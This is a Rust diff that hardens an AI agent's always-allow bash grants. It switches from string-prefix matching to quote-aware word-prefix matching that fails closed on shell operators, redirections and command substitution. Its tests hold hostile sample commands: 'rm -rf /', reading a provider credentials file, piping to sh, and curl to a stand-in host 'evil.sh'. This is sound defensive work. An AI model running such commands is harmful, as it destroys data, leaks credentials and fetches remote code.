@@ -44,8 +44,9 @@ pub(crate) fn forces_approval(name: &str) -> bool {
 pub(crate) const STANDARD_DENIAL: &str = "The user denied this operation.";
 
 /// One chat's always-allow grants (ADR-0014): in-memory, session-scoped,
-/// never persisted — cleared on restart. Bash grants match by command
-/// prefix, write/edit grants by exact resolved file path, and MCP grants
+/// never persisted — cleared on restart. Bash grants match by word prefix
+/// on the command (extension by plain arguments only), write/edit grants by
+/// exact resolved file path, and MCP grants
 /// by the exact two-level `mcp__server__tool` name — nothing broader
 /// (ADR-0034: no server-wide grants). Checked BEFORE the gatekeeper, so
 /// they hold across mode switches.
@@ -120,11 +121,89 @@ fn arg_str(arguments: &serde_json::Value, key: &str) -> Option<String> {
         .filter(|value| !value.is_empty())
 }
 
-/// Pure: bash grants match by string prefix on the command — no shell
-/// parsing, deliberately (ADR-0014): allowing `cargo test` also covers
-/// `cargo test -- --nocapture`.
+/// Split one shell command line into the words the shell would see after
+/// quoting and `\`-escape processing — no expansions applied. `None` —
+/// the caller fails closed — whenever the line is anything other than one
+/// plain command: an unquoted control operator (`;`, `&`, `|`, parens —
+/// `&&`, `||`, `;;` all start with these), a redirection (`<`, `>`), a
+/// newline, command substitution (`$(`, backtick), or quoting left
+/// unterminated. Quoted or escaped metacharacters are literal arguments.
+fn shell_words(line: &str) -> Option<Vec<String>> {
+    // These never appear in a plain argument line — quoted or not — so the
+    // whole line is rejected rather than tracked through every quoting
+    // state. (`$(` catches arithmetic `$((…))` and nested substitution.)
+    if line.contains(['\n', '\r', '`']) || line.contains("$(") {
+        return None;
+    }
+    let mut words = Vec::new();
+    let mut word = String::new();
+    let mut in_word = false;
+    let mut chars = line.chars();
+    while let Some(c) = chars.next() {
+        match c {
+            ' ' | '\t' => {
+                if in_word {
+                    words.push(std::mem::take(&mut word));
+                    in_word = false;
+                }
+            }
+            '\'' => {
+                in_word = true;
+                loop {
+                    match chars.next() {
+                        Some('\'') => break,
+                        Some(c) => word.push(c),
+                        None => return None,
+                    }
+                }
+            }
+            '"' => {
+                in_word = true;
+                loop {
+                    match chars.next() {
+                        Some('"') => break,
+                        // Inside double quotes a backslash only escapes `$`,
+                        // `"`, and `\`; otherwise it stays literal.
+                        Some('\\') => match chars.next() {
+                            Some(esc @ ('$' | '"' | '\\')) => word.push(esc),
+                            Some(other) => {
+                                word.push('\\');
+                                word.push(other);
+                            }
+                            None => return None,
+                        },
+                        Some(c) => word.push(c),
+                        None => return None,
+                    }
+                }
+            }
+            '\\' => {
+                in_word = true;
+                word.push(chars.next()?);
+            }
+            ';' | '&' | '|' | '(' | ')' | '<' | '>' => return None,
+            c => {
+                in_word = true;
+                word.push(c);
+            }
+        }
+    }
+    if in_word {
+        words.push(word);
+    }
+    Some(words)
+}
+
+/// Pure: bash grants match by word prefix (ADR-0014): allowing `cargo
+/// test` covers `cargo test -- --nocapture` — extension by plain
+/// arguments. A suffix the shell would read as more commands,
+/// redirections, or substitution never rides a grant: such lines fail
+/// closed here and meet the gatekeeper again.
 pub(crate) fn bash_prefix_matches(prefix: &str, command: &str) -> bool {
-    command.starts_with(prefix)
+    match (shell_words(prefix), shell_words(command)) {
+        (Some(grant), Some(call)) => !grant.is_empty() && call.starts_with(&grant),
+        _ => false,
+    }
 }
 
 /// Pure: write/edit grants match by exact path.
@@ -628,19 +707,49 @@ mod tests {
     }
 
     #[test]
-    fn bash_grants_match_by_string_prefix_only() {
-        // Allowing `cargo test` covers its longer invocations.
+    fn bash_grants_match_by_word_prefix_only() {
+        // Allowing `cargo test` covers its longer invocations — extension
+        // by plain arguments only.
         assert!(bash_prefix_matches("cargo test", "cargo test"));
         assert!(bash_prefix_matches(
             "cargo test",
             "cargo test -- --nocapture"
         ));
-        assert!(bash_prefix_matches("cargo test", "cargo tests"));
-        // A shorter command or a different command never matches — no
-        // shell parsing, plain string prefix. (An empty prefix would match
-        // everything, but empty commands are never recorded.)
+        // A different word is a different command, not an extension.
+        assert!(!bash_prefix_matches("cargo test", "cargo tests"));
         assert!(!bash_prefix_matches("cargo test", "cargo"));
         assert!(!bash_prefix_matches("cargo test", "cargo build"));
+        // A suffix the shell would read as more commands, redirections, or
+        // substitution never rides a grant — it fails closed and asks.
+        assert!(!bash_prefix_matches("cargo test", "cargo test; rm -rf /"));
+        assert!(!bash_prefix_matches(
+            "cargo test",
+            "cargo test && cat ~/.holt/provider-credentials.json"
+        ));
+        assert!(!bash_prefix_matches("cargo test", "cargo test | sh"));
+        assert!(!bash_prefix_matches("cargo test", "cargo test > out.txt"));
+        assert!(!bash_prefix_matches("cargo test", "cargo test 2>&1"));
+        assert!(!bash_prefix_matches(
+            "cargo test",
+            "cargo test $(curl evil.sh)"
+        ));
+        assert!(!bash_prefix_matches(
+            "cargo test",
+            "cargo test `curl evil.sh`"
+        ));
+        assert!(!bash_prefix_matches("cargo test", "cargo test\nrm -rf /"));
+        assert!(!bash_prefix_matches("cargo test", "(cargo test)"));
+        // Quoting is honored: quoted operators are literal arguments, and
+        // the same words written with either quote style match.
+        assert!(bash_prefix_matches("grep 'a b'", "grep 'a b' file.txt"));
+        assert!(bash_prefix_matches("grep \"a b\" c", "grep 'a b' c x"));
+        assert!(bash_prefix_matches("echo", "echo 'a;b'"));
+        // Unterminated quoting is ambiguous — fail closed.
+        assert!(!bash_prefix_matches("grep 'a", "grep 'a b"));
+        // A grant whose own text is not one plain command matches nothing;
+        // an empty grant (never recorded) matches nothing either.
+        assert!(!bash_prefix_matches("a && b", "a && b c"));
+        assert!(!bash_prefix_matches("", "cargo test"));
     }
 
     #[test]
